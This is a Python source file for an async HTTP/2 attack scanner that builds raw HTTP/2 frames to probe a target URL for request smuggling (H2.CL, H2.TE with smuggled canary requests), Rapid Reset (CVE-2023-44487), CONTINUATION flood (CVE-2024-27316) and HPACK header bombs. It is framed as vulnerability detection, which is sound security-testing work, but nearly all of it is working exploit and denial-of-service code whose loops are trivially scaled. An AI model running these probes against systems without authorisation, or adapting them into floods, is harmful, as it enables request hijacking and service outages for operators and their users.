"""
HTTP/2 Attack Engine
=====================
Async HTTP/2 attack surface scanner covering request smuggling, protocol-level
DoS, and amplification attacks.

Covers:
1. **H2 Support Detection**     — ALPN negotiation, Alt-Svc header
2. **H2.CL Smuggling**          — Content-Length in H2 → HTTP/1.1 backend
3. **H2.TE Smuggling**          — Transfer-Encoding in H2 pseudo-headers
4. **Rapid Reset (CVE-2023-44487)** — HEADERS + RST_STREAM flood
5. **Continuation Flood (CVE-2024-27316)** — CONTINUATION without END_HEADERS
6. **HPACK Bomb**               — Header table size exhaustion

Uses raw socket-level HTTP/2 framing; falls back to aiohttp for high-level probes.
"""
from __future__ import annotations

import asyncio
import logging
import socket
import ssl
import struct
import time
import uuid
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse

try:
    import aiohttp
    _AIOHTTP = True
except ImportError:
    _AIOHTTP = False

# Optional hyperframe for cleaner HTTP/2 frame construction
try:
    import hyperframe.frame as _hf
    _HYPERFRAME = True
except ImportError:
    _HYPERFRAME = False

log = logging.getLogger("oneinfinity.http2_attack_engine")

# ─────────────────────────────────────────────────────────────────────────────
# HTTP/2 Constants
# ─────────────────────────────────────────────────────────────────────────────

_H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

# Frame types
_FRAME_DATA = 0x0
_FRAME_HEADERS = 0x1
_FRAME_PRIORITY = 0x2
_FRAME_RST_STREAM = 0x3
_FRAME_SETTINGS = 0x4
_FRAME_PUSH_PROMISE = 0x5
_FRAME_PING = 0x6
_FRAME_GOAWAY = 0x7
_FRAME_WINDOW_UPDATE = 0x8
_FRAME_CONTINUATION = 0x9

# Flags
_FLAG_END_STREAM = 0x1
_FLAG_END_HEADERS = 0x4
_FLAG_PADDED = 0x8
_FLAG_PRIORITY = 0x20
_FLAG_ACK = 0x1

# Settings identifiers
_SETTINGS_HEADER_TABLE_SIZE = 0x1
_SETTINGS_ENABLE_PUSH = 0x2
_SETTINGS_MAX_CONCURRENT_STREAMS = 0x3
_SETTINGS_INITIAL_WINDOW_SIZE = 0x4
_SETTINGS_MAX_FRAME_SIZE = 0x5
_SETTINGS_MAX_HEADER_LIST_SIZE = 0x6

_DEFAULT_TIMEOUT = 10
_RAPID_RESET_COUNT = 100  # number of RST streams to send


# ─────────────────────────────────────────────────────────────────────────────
# Low-Level HTTP/2 Frame Builders
# ─────────────────────────────────────────────────────────────────────────────

def _build_frame(frame_type: int, flags: int, stream_id: int, payload: bytes) -> bytes:
    """Encode a raw HTTP/2 frame per RFC 7540 §4.1."""
    length = len(payload)
    # 3-byte length + 1-byte type + 1-byte flags + 4-byte stream_id (R bit = 0)
    header = struct.pack(">I", length)[1:]  # 3 bytes
    header += bytes([frame_type, flags])
    header += struct.pack(">I", stream_id & 0x7FFFFFFF)
    return header + payload


def _build_settings_frame(settings: Optional[dict] = None) -> bytes:
    payload = b""
    for ident, value in (settings or {}).items():
        payload += struct.pack(">HI", ident, value)
    return _build_frame(_FRAME_SETTINGS, 0x0, 0, payload)


def _build_settings_ack() -> bytes:
    return _build_frame(_FRAME_SETTINGS, _FLAG_ACK, 0, b"")


def _build_rst_stream(stream_id: int, error_code: int = 0x0) -> bytes:
    return _build_frame(_FRAME_RST_STREAM, 0, stream_id, struct.pack(">I", error_code))


def _build_window_update(stream_id: int, increment: int) -> bytes:
    return _build_frame(_FRAME_WINDOW_UPDATE, 0, stream_id, struct.pack(">I", increment & 0x7FFFFFFF))


def _encode_hpack_string(value: bytes) -> bytes:
    """Minimal HPACK literal string encoding (no Huffman)."""
    length = len(value)
    if length < 0x80:
        return bytes([length]) + value
    # Multi-byte length (RFC 7541 §5.1)
    result = bytes([0x80 | 0x7F])
    length -= 0x7F
    while length >= 0x80:
        result += bytes([0x80 | (length & 0x7F)])
        length >>= 7
    result += bytes([length])
    return result + value


def _encode_hpack_literal(name: bytes, value: bytes) -> bytes:
    """Literal header field without indexing (RFC 7541 §6.2.2)."""
    return bytes([0x00]) + _encode_hpack_string(name) + _encode_hpack_string(value)


def _build_headers_frame(
    stream_id: int,
    method: str,
    path: str,
    host: str,
    scheme: str = "https",
    extra_headers: Optional[list] = None,
    end_stream: bool = True,
    end_headers: bool = True,
) -> bytes:
    """Build a HEADERS frame with minimal HPACK-encoded headers."""
    hpack = b""
    # Indexed pseudo-headers (static table)
    method_index = {
        "GET": bytes([0x82]),
        "POST": bytes([0x83]),
        "HEAD": bytes([0x86]),
    }.get(method.upper())
    if method_index:
        hpack += method_index
    else:
        hpack += _encode_hpack_literal(b":method", method.encode())

    hpack += bytes([0x84])  # :path = /  (static index 4)
    if path != "/":
        # Override with literal
        hpack = hpack[:-1]
        hpack += _encode_hpack_literal(b":path", path.encode())

    scheme_index = bytes([0x87]) if scheme == "https" else bytes([0x86])
    hpack += scheme_index
    hpack += _encode_hpack_literal(b":authority", host.encode())

    for hdr_name, hdr_value in (extra_headers or []):
        hpack += _encode_hpack_literal(
            hdr_name.encode() if isinstance(hdr_name, str) else hdr_name,
            hdr_value.encode() if isinstance(hdr_value, str) else hdr_value,
        )

    flags = 0
    if end_stream:
        flags |= _FLAG_END_STREAM
    if end_headers:
        flags |= _FLAG_END_HEADERS
    return _build_frame(_FRAME_HEADERS, flags, stream_id, hpack)


def _open_raw_socket(host: str, port: int, use_tls: bool, timeout: int) -> socket.socket:
    """Open a synchronous socket connection (optionally TLS with ALPN h2)."""
    sock = socket.create_connection((host, port), timeout=timeout)
    if use_tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2", "http/1.1"])
        sock = ctx.wrap_socket(sock, server_hostname=host)
    return sock


def _sock_send_recv(sock: socket.socket, data: bytes, max_bytes: int = 8192) -> bytes:
    if data:
        sock.sendall(data)
    try:
        return sock.recv(max_bytes)
    except (socket.timeout, OSError):
        return b""


# ─────────────────────────────────────────────────────────────────────────────
# Finding Factory
# ─────────────────────────────────────────────────────────────────────────────

def _make_finding(
    vuln_type: str,
    severity: str,
    url: str,
    payload: str,
    evidence: str,
    extra: Optional[dict] = None,
) -> dict:
    f: dict = {
        "finding_id": f"H2A-{uuid.uuid4().hex[:8].upper()}",
        "vuln_type": vuln_type,
        "severity": severity,
        "url": url,
        "target": url,
        "payload": payload,
        "evidence": evidence,
        "tool": "http2_attack_engine",
        "source_type": "active",
    }
    if extra:
        f.update(extra)
    return f


# ─────────────────────────────────────────────────────────────────────────────
# Scanner
# ─────────────────────────────────────────────────────────────────────────────

class HTTP2AttackEngine:
    """
    Full HTTP/2 protocol attack surface scanner.

    Combines socket-level raw framing with aiohttp-level checks.
    Handles ImportError for h2/hyperframe gracefully.
    """

    def __init__(self, timeout: int = _DEFAULT_TIMEOUT) -> None:
        self.timeout = timeout

    def _parse_target(self, target: str) -> tuple[str, str, int, bool]:
        """Return (scheme, host, port, use_tls)."""
        parsed = urlparse(target)
        scheme = parsed.scheme.lower() or "https"
        host = parsed.hostname or target
        use_tls = scheme == "https"
        port = parsed.port or (443 if use_tls else 80)
        return scheme, host, port, use_tls

    # ── H2 Support Detection ─────────────────────────────────────────────────

    async def detect_h2_support(self, target: str) -> bool:
        """
        Detect HTTP/2 support via ALPN negotiation (TLS) or
        Upgrade: h2c header in HTTP/1.1 response.

        Returns True if H2 is supported.
        """
        scheme, host, port, use_tls = self._parse_target(target)

        # Primary: TLS ALPN negotiation
        if use_tls:
            try:
                loop = asyncio.get_event_loop()
                result = await loop.run_in_executor(
                    None,
                    self._alpn_h2_check,
                    host, port,
                )
                if result:
                    log.debug("H2 detected via ALPN for %s", target)
                    return True
            except Exception as exc:
                log.debug("ALPN H2 check error %s: %s", target, exc)

        # Fallback: check Upgrade: h2c response header via HTTP/1.1
        if _AIOHTTP:
            try:
                ssl_ctx = None
                if use_tls:
                    ssl_ctx = ssl.create_default_context()
                    ssl_ctx.check_hostname = False
                    ssl_ctx.verify_mode = ssl.CERT_NONE
                connector = aiohttp.TCPConnector(ssl=ssl_ctx) if ssl_ctx else aiohttp.TCPConnector()
                timeout_cfg = aiohttp.ClientTimeout(total=self.timeout)
                async with aiohttp.ClientSession(connector=connector, timeout=timeout_cfg) as sess:
                    upgrade_headers = {
                        "Upgrade": "h2c",
                        "Connection": "Upgrade, HTTP2-Settings",
                        "HTTP2-Settings": "AAMAAABkAAQAAP__",
                    }
                    async with sess.get(target, headers=upgrade_headers) as resp:
                        upgrade_resp = resp.headers.get("Upgrade", "").lower()
                        if "h2" in upgrade_resp or resp.status == 101:
                            log.debug("H2 detected via Upgrade header for %s", target)
                            return True
                        # Alt-Svc also indicates H2/H3 support
                        alt_svc = resp.headers.get("Alt-Svc", "").lower()
                        if "h2" in alt_svc or "h3" in alt_svc:
                            log.debug("H2/H3 detected via Alt-Svc for %s", target)
                            return True
            except Exception as exc:
                log.debug("H2 Upgrade check error %s: %s", target, exc)

        return False

    def _alpn_h2_check(self, host: str, port: int) -> bool:
        """Synchronous ALPN check; runs in executor."""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2", "http/1.1"])
        try:
            sock = socket.create_connection((host, port), timeout=self.timeout)
            tls_sock = ctx.wrap_socket(sock, server_hostname=host)
            negotiated = tls_sock.selected_alpn_protocol()
            tls_sock.close()
            return negotiated == "h2"
        except Exception:
            return False

    # ── H2.CL Smuggling ──────────────────────────────────────────────────────

    async def test_h2_cl_smuggling(self, target: str) -> Optional[dict]:
        """
        HTTP/2 frontend + HTTP/1.1 backend: inject Content-Length in H2 request.

        Attack: When an H2 frontend strips Content-Length and a backend parses
        it in the rewritten HTTP/1.1 body, the backend may consume extra bytes
        from the next pipelined request.

        Detection: timing differential or response splitting evidence.
        """
        scheme, host, port, use_tls = self._parse_target(target)

        # CL value declares only 3 bytes but we send smuggled suffix
        smuggled_prefix = "GET /h2cl-canary HTTP/1.1\r\nHost: "
        smuggled_body = f"{smuggled_prefix}{host}\r\n\r\n"
        body_bytes = b"abc"  # The 3 bytes matching Content-Length

        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(
            None,
            self._h2_cl_probe,
            host, port, use_tls, scheme, smuggled_body, body_bytes,
        )
        return result

    def _h2_cl_probe(
        self,
        host: str,
        port: int,
        use_tls: bool,
        scheme: str,
        smuggled_body: str,
        body_bytes: bytes,
    ) -> Optional[dict]:
        url = f"{scheme}://{host}/"
        try:
            sock = _open_raw_socket(host, port, use_tls, self.timeout)

            preface = (
                _H2_PREFACE
                + _build_settings_frame()
                + _build_settings_ack()
                + _build_window_update(0, 65535)
            )
            sock.sendall(preface)
            time.sleep(0.1)

            # HEADERS frame: inject content-length mismatch
            headers_frame = _build_headers_frame(
                stream_id=1,
                method="POST",
                path="/",
                host=host,
                scheme=scheme,
                extra_headers=[
                    ("content-length", str(len(body_bytes))),
                    ("content-type", "application/x-www-form-urlencoded"),
                ],
                end_stream=False,
                end_headers=True,
            )

            # DATA frame contains declared body + smuggled suffix
            full_body = body_bytes + smuggled_body.encode()
            data_frame = _build_frame(_FRAME_DATA, _FLAG_END_STREAM, 1, full_body)

            t0 = time.time()
            sock.sendall(headers_frame + data_frame)
            response = _sock_send_recv(sock, b"", 8192)
            elapsed = time.time() - t0
            sock.close()

            resp_text = response.decode("utf-8", errors="replace")

            # Signs of smuggling: unexpected path in response, split response, canary path
            if "h2cl-canary" in resp_text or (elapsed > 2.0 and len(response) > 9):
                return _make_finding(
                    vuln_type="h2_cl_smuggling",
                    severity="critical",
                    url=url,
                    payload=f"H2 POST with Content-Length:{len(body_bytes)}, body={len(full_body)} bytes",
                    evidence=(
                        f"H2.CL smuggling probe returned in {elapsed:.2f}s. "
                        f"Canary path reflected or unexpected body size accepted. "
                        f"Response snippet: {resp_text[:200]!r}"
                    ),
                    extra={
                        "technique": "H2.CL",
                        "elapsed_s": round(elapsed, 3),
                        "response_length": len(response),
                        "references": [
                            "https://portswigger.net/research/http2",
                            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25329",
                        ],
                    },
                )
        except (socket.error, ssl.SSLError, OSError) as exc:
            log.debug("H2.CL probe failed for %s: %s", url, exc)
        return None

    # ── H2.TE Smuggling ──────────────────────────────────────────────────────

    async def test_h2_te_smuggling(self, target: str) -> Optional[dict]:
        """
        Inject Transfer-Encoding header in H2 request.

        HTTP/2 disallows TE/Transfer-Encoding per RFC 7540 §8.1.2.2.
        A server that forwards these headers to an HTTP/1.1 backend may
        enable TE.CL or TE.TE desync attacks.
        """
        scheme, host, port, use_tls = self._parse_target(target)
        url = f"{scheme}://{host}/"

        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(
            None, self._h2_te_probe, host, port, use_tls, scheme,
        )
        return result

    def _h2_te_probe(self, host: str, port: int, use_tls: bool, scheme: str) -> Optional[dict]:
        url = f"{scheme}://{host}/"
        te_payloads = [
            ("transfer-encoding", "chunked"),
            ("transfer-encoding", "identity"),
            ("transfer-encoding", "chunked\r\nTransfer-Encoding: identity"),
        ]
        for te_name, te_value in te_payloads:
            try:
                sock = _open_raw_socket(host, port, use_tls, self.timeout)
                sock.sendall(_H2_PREFACE + _build_settings_frame() + _build_settings_ack())
                time.sleep(0.1)

                headers_frame = _build_headers_frame(
                    stream_id=1,
                    method="POST",
                    path="/",
                    host=host,
                    scheme=scheme,
                    extra_headers=[
                        (te_name, te_value),
                        ("content-length", "4"),
                        ("content-type", "application/x-www-form-urlencoded"),
                    ],
                    end_stream=False,
                    end_headers=True,
                )
                # Chunked body with smuggled request
                data_payload = b"4\r\ntest\r\n0\r\n\r\nGET /h2te-canary HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n"
                data_frame = _build_frame(_FRAME_DATA, _FLAG_END_STREAM, 1, data_payload)

                t0 = time.time()
                sock.sendall(headers_frame + data_frame)
                response = _sock_send_recv(sock, b"", 8192)
                elapsed = time.time() - t0
                sock.close()

                resp_text = response.decode("utf-8", errors="replace")

                # Server did NOT reject TE header (RFC violation) or reflected canary
                if "h2te-canary" in resp_text:
                    return _make_finding(
                        vuln_type="h2_te_smuggling",
                        severity="critical",
                        url=url,
                        payload=f"{te_name}: {te_value}",
                        evidence=(
                            f"H2.TE smuggling: canary path /h2te-canary reflected in response. "
                            f"Transfer-Encoding header accepted in H2 request (RFC 7540 §8.1.2.2 violation). "
                            f"Response: {resp_text[:200]!r}"
                        ),
                        extra={
                            "technique": "H2.TE",
                            "te_value": te_value,
                            "elapsed_s": round(elapsed, 3),
                        },
                    )

                # Server did not reject TE in H2 (should return RST_STREAM or 400)
                if len(response) > 9 and b"\x00\x03" not in response:
                    # RST_STREAM frame type is 0x3; absence may mean server accepted TE
                    return _make_finding(
                        vuln_type="h2_te_accepted",
                        severity="high",
                        url=url,
                        payload=f"{te_name}: {te_value}",
                        evidence=(
                            f"Server accepted HTTP/2 request containing prohibited {te_name!r} header "
                            f"without RST_STREAM (RFC 7540 §8.1.2.2 violation). "
                            f"Potential H2.TE smuggling primitive."
                        ),
                        extra={"technique": "H2.TE", "te_value": te_value},
                    )
            except (socket.error, ssl.SSLError, OSError) as exc:
                log.debug("H2.TE probe %s=%s failed: %s", te_name, te_value, exc)
        return None

    # ── Rapid Reset (CVE-2023-44487) ─────────────────────────────────────────

    async def test_rapid_reset(self, target: str) -> Optional[dict]:
        """
        CVE-2023-44487: HTTP/2 Rapid Reset Attack.

        Send many HEADERS frames immediately followed by RST_STREAM to
        exhaust server-side stream processing without triggering
        MAX_CONCURRENT_STREAMS limits.

        Detection: server closes connection prematurely, returns 503,
        or exhibits latency indicative of resource exhaustion.
        """
        scheme, host, port, use_tls = self._parse_target(target)
        url = f"{scheme}://{host}/"

        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(
            None, self._rapid_reset_probe, host, port, use_tls, scheme,
        )
        return result

    def _rapid_reset_probe(self, host: str, port: int, use_tls: bool, scheme: str) -> Optional[dict]:
        url = f"{scheme}://{host}/"
        count = _RAPID_RESET_COUNT
        try:
            sock = _open_raw_socket(host, port, use_tls, self.timeout)
            sock.sendall(_H2_PREFACE + _build_settings_frame() + _build_settings_ack())
            time.sleep(0.15)

            # Build burst of HEADERS + RST_STREAM pairs
            burst = b""
            for i in range(1, count + 1, 2):  # odd stream IDs
                headers_frame = _build_headers_frame(
                    stream_id=i,
                    method="GET",
                    path="/",
                    host=host,
                    scheme=scheme,
                    end_stream=False,  # do NOT end stream yet
                    end_headers=True,
                )
                rst_frame = _build_rst_stream(i, error_code=0x8)  # CANCEL
                burst += headers_frame + rst_frame

            t0 = time.time()
            sock.sendall(burst)

            # Collect responses for up to timeout/2 seconds
            responses = b""
            deadline = t0 + (self.timeout / 2)
            try:
                sock.settimeout(1.0)
                while time.time() < deadline:
                    chunk = sock.recv(65536)
                    if not chunk:
                        break
                    responses += chunk
            except (socket.timeout, OSError):
                pass

            elapsed = time.time() - t0
            sock.close()

            resp_text = responses.decode("utf-8", errors="replace")

            # Count RST_STREAM frames received back (type 0x3)
            # Frame header is 9 bytes; RST_STREAM payload is 4 bytes
            rst_received = responses.count(bytes([0x00, 0x00, 0x04, 0x03]))

            # GOAWAY received = server terminated connection
            goaway_received = bytes([0x00, 0x00, 0x00, 0x07]) in responses  # type 0x7

            # 503 or connection drop under load
            error_503 = b"503" in responses[:200]

            if goaway_received or error_503 or (elapsed < 1.0 and rst_received > 10):
                severity = "critical" if goaway_received or error_503 else "high"
                return _make_finding(
                    vuln_type="h2_rapid_reset_cve_2023_44487",
                    severity=severity,
                    url=url,
                    payload=f"HTTP/2 HEADERS+RST_STREAM burst x{count}",
                    evidence=(
                        f"Rapid Reset probe sent {count} HEADERS+RST_STREAM pairs in {elapsed:.2f}s. "
                        f"GOAWAY received: {goaway_received}, 503 detected: {error_503}, "
                        f"RST frames back: {rst_received}. "
                        f"Server may be vulnerable to CVE-2023-44487."
                    ),
                    extra={
                        "cve": "CVE-2023-44487",
                        "stream_count": count,
                        "elapsed_s": round(elapsed, 3),
                        "goaway_received": goaway_received,
                        "rst_received": rst_received,
                        "technique": "rapid_reset",
                    },
                )
        except (socket.error, ssl.SSLError, OSError) as exc:
            log.debug("Rapid reset probe failed for %s: %s", url, exc)
        return None

    # ── Continuation Flood (CVE-2024-27316) ──────────────────────────────────

    async def test_continuation_flood(self, target: str) -> Optional[dict]:
        """
        CVE-2024-27316: HTTP/2 CONTINUATION Flood.

        Send many CONTINUATION frames for a single stream without ever
        setting END_HEADERS. Servers that buffer headers indefinitely are
        vulnerable to memory exhaustion.

        Detection: server closes connection prematurely, latency spike, or OOM indicators.
        """
        scheme, host, port, use_tls = self._parse_target(target)
        url = f"{scheme}://{host}/"

        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(
            None, self._continuation_flood_probe, host, port, use_tls, scheme,
        )
        return result

    def _continuation_flood_probe(self, host: str, port: int, use_tls: bool, scheme: str) -> Optional[dict]:
        url = f"{scheme}://{host}/"
        continuation_count = 200
        try:
            sock = _open_raw_socket(host, port, use_tls, self.timeout)
            sock.sendall(_H2_PREFACE + _build_settings_frame() + _build_settings_ack())
            time.sleep(0.1)

            # Initial HEADERS frame WITHOUT END_HEADERS
            hpack = b"\x82\x84\x87"  # :method GET, :path /, :scheme https
            hpack += _encode_hpack_literal(b":authority", host.encode())
            headers_frame = _build_frame(_FRAME_HEADERS, 0x0, 1, hpack)  # flags=0: no END_HEADERS

            # Build CONTINUATION frames (each also without END_HEADERS until the last)
            continuation_payload = _encode_hpack_literal(b"x-cont-flood", b"A" * 100)
            continuations = b""
            for i in range(continuation_count):
                flags = _FLAG_END_HEADERS if i == continuation_count - 1 else 0
                continuations += _build_frame(_FRAME_CONTINUATION, flags, 1, continuation_payload)

            t0 = time.time()
            sock.sendall(headers_frame)
            sock.sendall(continuations)

            response = b""
            deadline = t0 + min(self.timeout, 5)
            try:
                sock.settimeout(1.0)
                while time.time() < deadline:
                    chunk = sock.recv(8192)
                    if not chunk:
                        break
                    response += chunk
            except (socket.timeout, OSError):
                pass

            elapsed = time.time() - t0
            sock.close()

            resp_text = response.decode("utf-8", errors="replace")

            # Signs of vulnerability: server kept connection open through all CONTINUATION frames
            # or took unusually long to respond
            goaway = bytes([0x00, 0x00, 0x00, 0x07]) in response
            response_400 = b"400" in response[:100]
            accepted = not goaway and not response_400 and len(response) > 9

            if accepted or elapsed > 2.0:
                severity = "high" if accepted else "medium"
                return _make_finding(
                    vuln_type="h2_continuation_flood_cve_2024_27316",
                    severity=severity,
                    url=url,
                    payload=f"HTTP/2 CONTINUATION flood x{continuation_count} without END_HEADERS",
                    evidence=(
                        f"CONTINUATION flood probe: {continuation_count} frames sent in {elapsed:.2f}s. "
                        f"Server accepted frames without premature GOAWAY: {accepted}. "
                        f"Potential CVE-2024-27316 vulnerability — server may buffer headers unboundedly."
                    ),
                    extra={
                        "cve": "CVE-2024-27316",
                        "continuation_count": continuation_count,
                        "elapsed_s": round(elapsed, 3),
                        "goaway_received": goaway,
                        "technique": "continuation_flood",
                    },
                )
        except (socket.error, ssl.SSLError, OSError) as exc:
            log.debug("CONTINUATION flood probe failed for %s: %s", url, exc)
        return None

    # ── HPACK Bomb ───────────────────────────────────────────────────────────

    async def test_hpack_bomb(self, target: str) -> Optional[dict]:
        """
        HPACK bomb: send a highly compressed HPACK header block that
        decompresses to a very large set of headers, exhausting server memory.

        Uses the dynamic table: add large headers to table (indexed), then
        reference them repeatedly to cause O(1) wire → O(N) memory expansion.
        """
        scheme, host, port, use_tls = self._parse_target(target)
        url = f"{scheme}://{host}/"

        loop = asyncio.get_event_loop()
        result = await loop.run_in_executor(
            None, self._hpack_bomb_probe, host, port, use_tls, scheme,
        )
        return result

    def _hpack_bomb_probe(self, host: str, port: int, use_tls: bool, scheme: str) -> Optional[dict]:
        url = f"{scheme}://{host}/"
        header_count = 100
        header_value_size = 512
        try:
            sock = _open_raw_socket(host, port, use_tls, self.timeout)

            # Request large HEADER_TABLE_SIZE from server
            sock.sendall(
                _H2_PREFACE
                + _build_settings_frame({_SETTINGS_HEADER_TABLE_SIZE: 65535})
                + _build_settings_ack()
            )
            time.sleep(0.1)

            # Build large HPACK block: many headers with large values
            big_value = ("X" * header_value_size).encode()
            hpack = bytes([0x82, 0x84, 0x87])  # :method, :path, :scheme (indexed)
            hpack += _encode_hpack_literal(b":authority", host.encode())
            for i in range(header_count):
                hpack += _encode_hpack_literal(f"x-hpack-bomb-{i:04d}".encode(), big_value)

            t0 = time.time()
            frame = _build_frame(_FRAME_HEADERS, _FLAG_END_STREAM | _FLAG_END_HEADERS, 1, hpack)
            sock.sendall(frame)
            response = _sock_send_recv(sock, b"", 8192)
            elapsed = time.time() - t0
            sock.close()

            approx_size_kb = (header_count * header_value_size) // 1024

            # Server stalled under the large header block
            if elapsed > 1.5 and len(response) > 9:
                return _make_finding(
                    vuln_type="h2_hpack_bomb",
                    severity="high",
                    url=url,
                    payload=f"HPACK block: {header_count} headers × {header_value_size}B = ~{approx_size_kb}KB",
                    evidence=(
                        f"Server took {elapsed:.2f}s to process ~{approx_size_kb}KB HPACK header block "
                        f"({header_count} headers × {header_value_size}B values). "
                        f"No HEADER_TABLE_SIZE enforcement detected. Potential memory exhaustion."
                    ),
                    extra={
                        "technique": "hpack_bomb",
                        "header_count": header_count,
                        "header_value_size": header_value_size,
                        "approx_size_kb": approx_size_kb,
                        "elapsed_s": round(elapsed, 3),
                    },
                )

            # Server rejected with GOAWAY or RST — still interesting
            goaway = bytes([0x00, 0x00, 0x00, 0x07]) in response
            if goaway:
                return _make_finding(
                    vuln_type="h2_hpack_bomb_rejected",
                    severity="info",
                    url=url,
                    payload=f"HPACK block: {header_count} headers × {header_value_size}B",
                    evidence=(
                        f"Server sent GOAWAY in response to ~{approx_size_kb}KB HPACK header block "
                        f"in {elapsed:.2f}s. Server protects against HPACK bombs (good)."
                    ),
                    extra={
                        "technique": "hpack_bomb",
                        "protected": True,
                        "elapsed_s": round(elapsed, 3),
                    },
                )
        except (socket.error, ssl.SSLError, OSError) as exc:
            log.debug("HPACK bomb probe failed for %s: %s", url, exc)
        return None

    # ── Orchestration ─────────────────────────────────────────────────────────

    async def scan(self, target: str) -> list[dict]:
        """
        Full HTTP/2 attack surface scan.

        Runs all H2 attack probes concurrently; aggregates findings.

        Parameters
        ----------
        target : str
            Base URL to scan (e.g. https://example.com).

        Returns
        -------
        list[dict]
            Findings with keys: vuln_type, severity, url, payload, evidence, tool, target.
        """
        findings: list[dict] = []

        # Detect H2 support first; still run probes even if undetected (proxy may translate)
        try:
            h2_supported = await self.detect_h2_support(target)
            if not h2_supported:
                log.debug("H2 not detected for %s; probes may still find issues via proxy", target)
        except Exception as exc:
            log.debug("H2 detection error %s: %s", target, exc)
            h2_supported = False

        # Run all attack probes concurrently
        probe_coros = [
            self.test_h2_cl_smuggling(target),
            self.test_h2_te_smuggling(target),
            self.test_rapid_reset(target),
            self.test_continuation_flood(target),
            self.test_hpack_bomb(target),
        ]

        results = await asyncio.gather(*probe_coros, return_exceptions=True)

        for res in results:
            if isinstance(res, dict):
                findings.append(res)
            elif isinstance(res, Exception):
                log.debug("H2 probe error: %s", res)

        # Annotate all findings with h2_supported flag
        for f in findings:
            f["h2_supported"] = h2_supported

        return findings


# ─────────────────────────────────────────────────────────────────────────────
# Convenience
# ─────────────────────────────────────────────────────────────────────────────

async def scan_http2(target: str, timeout: int = 10) -> list[dict]:
    """Async convenience wrapper."""
    engine = HTTP2AttackEngine(timeout=timeout)
    return await engine.scan(target)
